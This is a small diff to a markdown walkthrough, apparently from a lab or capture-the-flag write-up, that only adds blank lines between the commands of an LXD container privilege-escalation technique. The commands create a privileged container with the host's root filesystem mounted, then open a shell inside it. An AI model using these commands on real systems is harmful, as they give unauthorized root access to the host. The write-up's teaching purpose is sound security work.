@@ -50,9 +50,13 @@ For gaining root privileges we need to import the previously downloaded containe
 After that, we need to give the container privileges, add the root directory as a mount point, and start the container.
 To do all this, run following commands on the target machine:
 > lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage  
+
 > lxc init myimage ignite -c security.privileged=true  
+
 > lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true  
+
 > lxc start ignite  
+
 > lxc exec ignite /bin/sh  
 
 If everything succeded, we should get a bash shell in which we can do the following to actually get to the root directories  
